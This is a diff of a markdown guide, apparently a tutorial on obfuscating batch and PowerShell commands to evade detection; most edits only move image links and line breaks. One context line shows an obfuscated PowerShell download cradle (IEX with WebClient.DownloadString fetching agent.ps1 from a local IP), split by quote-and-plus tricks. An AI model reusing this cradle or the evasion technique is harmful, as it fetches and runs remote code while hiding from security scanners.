@@ -1,5 +1,3 @@
-<br />
-
 ![banner](http://i.cubeupload.com/1Kopfs.jpg)
 
 <br />
@@ -13,6 +11,8 @@
 
 ![detection pic](http://i.cubeupload.com/pLllwr.jpg)
 
+<br />
+
       Special note:
         Remenber that if we chose to use the 'batch' obfuscation technic, then it will only work in MS-DOS
         interpreter (cmd.exe or file.bat). If we use one 'batch' special caracter in powershell terminal
@@ -21,8 +21,11 @@
 **Bad caracter sellection** [ batch escape caracter -used- in powershell terminal ]
 ![bad caracter sellection](http://i.cubeupload.com/5bsI07.jpg)
 
+**Good caracter sellection** [ powershell special caracter used in powershell terminal ]
+![powershell obfuscation](http://i.cubeupload.com/36MUH2.jpg)
 
-<br /><br /><br /><br />
+
+<br /><br /><br /><br /><br />
 
 ## Batch Obfuscation
 
@@ -118,8 +121,6 @@ The above string can be obfuscated using **powershell special caracters:** **`**
 - Using **powershell special caracters: '** and **+**
 
       power'+'shell.exe IEX (New-Ob'+'ject Net.'+'WebCl'+'ient).Do'+'wnloadSt'+'ring('//19'+'2.16'+'8.1.71/agent.ps1')
-
-![powershell obfuscation](http://i.cubeupload.com/36MUH2.jpg)
 
 - Using an **batch** local variable inside powershell interpreter
 
